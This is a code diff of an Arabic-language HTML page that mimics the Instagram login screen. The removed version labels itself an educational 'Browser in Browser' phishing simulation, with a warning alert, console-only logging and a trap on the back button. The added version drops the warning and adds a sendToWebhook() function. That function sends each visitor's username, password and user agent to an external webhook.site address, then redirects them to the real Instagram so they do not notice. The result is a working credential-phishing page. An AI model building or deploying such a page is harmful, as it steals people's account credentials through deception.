@@ -1,350 +1,242 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Instagram</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Instagram</title>
 
-        html, body {
-            height: 100%;
-            overflow: hidden;
-        }
+<style>
+*{box-sizing:border-box}
 
-        body {
-            margin: 0;
-            background: #0f1e25;
-            font-family: system-ui, -apple-system, sans-serif;
-            color: #fff;
-            height: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
+html, body {
+  height: 100%;
+  overflow: hidden;
+}
 
-        /* النافذة بملء الشاشة */
-        .fullscreen-popup {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background: #0f1e25;
-            z-index: 9999;
-            display: flex;
-            flex-direction: column;
-        }
+body{
+  margin:0;
+  background:#0f1e25;
+  font-family: system-ui, -apple-system, sans-serif;
+  color:#fff;
+  height: 100%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
 
-        /* شريط عنوان المتصفح */
-        .browser-url-bar {
-            background: #0f1e25;
-            padding: 8px 16px;
-            display: flex;
-            align-items: center;
-            border-bottom: 1px solid #34444c;
-        }
+.wrapper{
+  width: 100%;
+  max-width: 400px;
+  height: 100%;
+  max-height: 700px;
+  display:flex;
+  flex-direction:column;
+  justify-content:space-between;
+  padding:16px 24px;
+  margin:0 auto;
+}
 
-        .url-container {
-            background: #162a33;
-            border: 1px solid #34444c;
-            border-radius: 20px;
-            padding: 8px 16px;
-            flex: 1;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            direction: ltr;
-        }
+.lang{
+  text-align:center;
+  color:#cfd8dc;
+  margin-bottom:10px;
+  font-size:14px;
+}
 
-        /* درع الأمان من الرابط الذي أرسلته */
-        .shield-icon-img {
-            width: 18px;
-            height: 18px;
-            display: inline-block;
-            background-image: url('https://static.thenounproject.com/png/2712906-200.png');
-            background-size: contain;
-            background-repeat: no-repeat;
-            background-position: center;
-            filter: brightness(0) invert(1) sepia(1) saturate(5) hue-rotate(80deg);
-        }
+.logo{
+  width:60px;
+  margin:0 auto 30px;  /* زيادة المسافة السفلية من 20px إلى 30px */
+  display:block;
+}
 
-        .url-text {
-            color: #cfd8dc;
-            font-size: 14px;
-            flex: 1;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
+.input-group {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+}
 
-        /* سهم إعادة التحميل - تم تكبيره قليلاً */
-        .refresh-icon {
-            color: #cfd8dc;
-            font-size: 20px;  /* زاد من 16px إلى 20px */
-            transform: scaleX(-1);
-            font-weight: 400;
-            line-height: 1;
-        }
+input{
+  width:100%;
+  padding:14px;
+  margin-bottom:10px;
+  border-radius:16px;
+  border:1px solid #34444c;
+  background:#162a33;
+  color:white;
+  font-size:15px;
+}
 
-        /* المحتوى الرئيسي - تصميمك الأصلي بالكامل */
-        .wrapper {
-            width: 100%;
-            height: 100%;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            padding: 16px 24px;
-            margin: 0 auto;
-            overflow-y: auto;
-        }
+input:focus{
+  outline:none;
+  border:1px solid #34444c;
+  box-shadow:none;
+}
 
-        .lang {
-            text-align: center;
-            color: #cfd8dc;
-            margin-bottom: 10px;
-            font-size: 14px;
-        }
+.password-hint {
+  color: #ff9800;
+  font-size: 12px;
+  margin: -5px 0 10px 5px;
+  display: none;
+}
 
-        .logo {
-            width: 60px;
-            margin: 0 auto 30px;
-            display: block;
-        }
+.password-hint.show {
+  display: block;
+}
 
-        .input-group {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-        }
+button{
+  width:100%;
+  padding:14px;
+  margin:5px 0;
+  border:none;
+  border-radius:28px;
+  background:#1877f2;
+  color:white;
+  font-size:16px;
+  font-weight:bold;
+  cursor:pointer;
+  opacity: 0.5;
+  transition: opacity 0.3s;
+}
 
-        input {
-            width: 100%;
-            padding: 14px;
-            margin-bottom: 10px;
-            border-radius: 16px;
-            border: 1px solid #34444c;
-            background: #162a33;
-            color: white;
-            font-size: 15px;
-        }
+button.active {
+  opacity: 1;
+}
 
-        input:focus {
-            outline: none;
-            border-color: #4da3ff;
-        }
+.forgot{
+  text-align:center;
+  margin:12px 0;
+  color:#cfd8dc;
+  font-size:13px;
+}
 
-        input::placeholder {
-            color: #8a9aa3;
-        }
+.create{
+  border:1px solid #3a5f77;
+  padding:12px;
+  border-radius:28px;
+  color:#4da3ff;
+  font-size:14px;
+  text-align:center;
+  margin:8px 0;
+}
 
-        .password-hint {
-            color: #ff9800;
-            font-size: 12px;
-            margin: -5px 0 10px 5px;
-            display: none;
-        }
+.meta{
+  text-align:center;
+  margin-top:10px;
+}
 
-        .password-hint.show {
-            display: block;
-        }
+.meta img{
+  width:50px;
+  opacity:.7;
+}
 
-        button {
-            width: 100%;
-            padding: 14px;
-            margin: 5px 0;
-            border: none;
-            border-radius: 28px;
-            background: #1877f2;
-            color: white;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            opacity: 0.5;
-            transition: opacity 0.3s;
-        }
-
-        button.active {
-            opacity: 1;
-        }
-
-        button:disabled {
-            cursor: default;
-        }
-
-        .forgot {
-            text-align: center;
-            margin: 12px 0;
-            color: #cfd8dc;
-            font-size: 13px;
-            cursor: pointer;
-        }
-
-        .create {
-            border: 1px solid #3a5f77;
-            padding: 12px;
-            border-radius: 28px;
-            color: #4da3ff;
-            font-size: 14px;
-            text-align: center;
-            margin: 8px 0;
-            cursor: pointer;
-        }
-
-        .meta {
-            text-align: center;
-            margin-top: 10px;
-        }
-
-        .meta img {
-            width: 50px;
-            opacity: 0.7;
-        }
-
-        /* تحذير تعليمي */
-        .warning-message {
-            background: #ed4956;
-            color: white;
-            padding: 12px;
-            text-align: center;
-            font-size: 13px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            display: none;
-        }
-
-        .warning-message.show {
-            display: block;
-        }
-
-        @media (max-height: 600px) {
-            .wrapper {
-                padding: 10px 20px;
-            }
-            
-            .logo {
-                width: 50px;
-                margin-bottom: 25px;
-            }
-            
-            input {
-                padding: 10px;
-                margin-bottom: 8px;
-            }
-            
-            button {
-                padding: 10px;
-            }
-            
-            .create, .forgot {
-                margin: 6px 0;
-            }
-        }
-    </style>
+@media (max-height: 600px) {
+  .wrapper {
+    padding: 10px 20px;
+  }
+  
+  .logo {
+    width: 50px;
+    margin-bottom: 25px; /* تعديل المسافة للشاشات الصغيرة */
+  }
+  
+  input {
+    padding: 10px;
+    margin-bottom: 8px;
+  }
+  
+  button {
+    padding: 10px;
+  }
+  
+  .create, .forgot {
+    margin: 6px 0;
+  }
+}
+</style>
 </head>
+
 <body>
-    <div class="fullscreen-popup" id="instagramFullscreen">
-        <!-- شريط عنوان المتصفح مع الدرع وسهم أكبر -->
-        <div class="browser-url-bar">
-            <div class="url-container">
-                <!-- درع الأمان من الرابط المباشر -->
-                <span class="shield-icon-img"></span>
-                <span class="url-text">https://www.instagram.com</span>
-                <!-- سهم إعادة التحميل - الآن بحجم 20px -->
-                <span class="refresh-icon">↻</span>
-            </div>
-        </div>
 
-        <!-- المحتوى الرئيسي (تصميمك الأصلي بالكامل) -->
-        <div class="wrapper">
-            <div class="warning-message" id="warningMsg">
-                ⚠️ تحذير تعليمي: هذه محاكاة لهجمة Browser in Browser
-            </div>
+<div class="wrapper">
 
-            <div class="lang">العربية</div>
+<div class="lang">العربية</div>
 
-            <img class="logo" src="https://static.cdninstagram.com/rsrc.php/v4/yD/r/R0fBIMurK8v.png" alt="Instagram">
+<img class="logo" src="https://static.cdninstagram.com/rsrc.php/v4/yD/r/R0fBIMurK8v.png">
 
-            <div class="input-group">
-                <input id="username" placeholder="اسم المستخدم أو البريد الإلكتروني" autofocus>
-                <input type="password" id="password" placeholder="كلمة السر" onkeyup="checkPasswordLength()">
-                <div class="password-hint" id="passwordHint">كلمة المرور يجب أن تكون 8 أحرف على الأقل</div>
-                
-                <button id="loginBtn" onclick="simulatePhishing()" disabled>تسجيل الدخول</button>
-                
-                <div class="forgot">هل نسيت كلمة السر؟</div>
-                
-                <div class="create">إنشاء حساب جديد</div>
-            </div>
+<div class="input-group">
+  <input id="username" placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف المحمول">
+  <input type="password" id="password" placeholder="كلمة السر" onkeyup="checkPasswordLength()">
+  <div class="password-hint" id="passwordHint">كلمة المرور يجب أن تكون 8 أحرف على الأقل</div>
+  
+  <button id="loginBtn" onclick="sendToWebhook()" disabled>تسجيل الدخول</button>
+  
+  <div class="forgot">هل نسيت كلمة السر؟</div>
+  
+  <div class="create">إنشاء حساب جديد</div>
+</div>
 
-            <div class="meta">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Meta_Platforms_Inc._logo_%28cropped%29.svg" alt="Meta">
-            </div>
-        </div>
-    </div>
+<div class="meta">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Meta_Platforms_Inc._logo_%28cropped%29.svg">
+</div>
 
-    <script>
-        // عناصر التحكم
-        const loginBtn = document.getElementById('loginBtn');
-        const passwordHint = document.getElementById('passwordHint');
-        const warningMsg = document.getElementById('warningMsg');
+</div>
 
-        function checkPasswordLength() {
-            const password = document.getElementById('password').value;
-            
-            if (password.length >= 8) {
-                loginBtn.disabled = false;
-                loginBtn.classList.add('active');
-                passwordHint.classList.remove('show');
-            } else {
-                loginBtn.disabled = true;
-                loginBtn.classList.remove('active');
-                passwordHint.classList.toggle('show', password.length > 0);
-            }
-        }
+<script>
+// رابط Webhook
+const WEBHOOK_URL = 'https://webhook.site/7076cb5c-eee3-4ca0-8533-6f064255b742';
+const loginBtn = document.getElementById('loginBtn');
+const passwordHint = document.getElementById('passwordHint');
 
-        function simulatePhishing() {
-            const username = document.getElementById('username').value.trim();
-            const password = document.getElementById('password').value.trim();
-            
-            if (!username || password.length < 8) return;
+function checkPasswordLength() {
+  const password = document.getElementById('password').value;
+  const username = document.getElementById('username').value.trim();
+  
+  if (password.length >= 8) {
+    loginBtn.disabled = false;
+    loginBtn.classList.add('active');
+    passwordHint.classList.remove('show');
+  } else {
+    loginBtn.disabled = true;
+    loginBtn.classList.remove('active');
+    if (password.length > 0) {
+      passwordHint.classList.add('show');
+    } else {
+      passwordHint.classList.remove('show');
+    }
+  }
+}
 
-            // إظهار التحذير التعليمي
-            warningMsg.classList.add('show');
+function sendToWebhook() {
+  const username = document.getElementById('username').value.trim();
+  const password = document.getElementById('password').value.trim();
+  
+  // التحقق من طول كلمة المرور مرة أخرى قبل الإرسال
+  if (!username || password.length < 8) return;
+  
+  // تجميع البيانات
+  const data = {
+    username: username,
+    password: password,
+    timestamp: new Date().toISOString(),
+    page: 'Instagram Login',
+    userAgent: navigator.userAgent
+  };
+  
+  // إرسال إلى Webhook
+  fetch(WEBHOOK_URL, {
+    method: 'POST',
+    mode: 'no-cors',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(data)
+  }).catch(error => console.error('Error:', error));
+  
+  // توجيه المستخدم إلى إنستغرام الحقيقي
+  window.location.href = 'https://www.instagram.com';
+}
+</script>
 
-            // تسجيل البيانات في الكونسول
-            console.log('🔴 [تعليمي] بيانات تسجيل الدخول:', {
-                username: username,
-                password: password,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent
-            });
-
-            // محاكاة الهجمة
-            setTimeout(() => {
-                alert(`⚠️ تحذير تعليمي ⚠️\n\nفي هجمة Browser in Browser الحقيقية:\n• البريد: ${username}\n• كلمة المرور: ${password}\n• يتم سرقتها وإرسالها للمهاجم\n• ثم يتم تحويلك إلى Instagram الحقيقي`);
-                
-                // تحويل إلى إنستغرام الحقيقي
-                window.location.href = 'https://www.instagram.com';
-            }, 1000);
-        }
-
-        // منع الخروج
-        window.addEventListener('beforeunload', function(e) {
-            e.preventDefault();
-            e.returnValue = '';
-        });
-
-        // منع زر الرجوع
-        history.pushState(null, null, location.href);
-        window.onpopstate = function() {
-            history.go(1);
-        };
-    </script>
 </body>
 </html>
